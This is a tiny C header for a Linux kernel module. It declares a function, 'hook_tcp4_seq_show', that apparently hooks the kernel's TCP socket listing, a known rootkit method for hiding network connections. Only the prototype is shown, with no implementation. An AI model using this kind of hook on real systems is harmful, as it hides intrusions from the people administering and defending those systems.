#pragma once

#include <linux/tcp.h>

asmlinkage int hook_tcp4_seq_show(struct seq_file* seq, void* v);
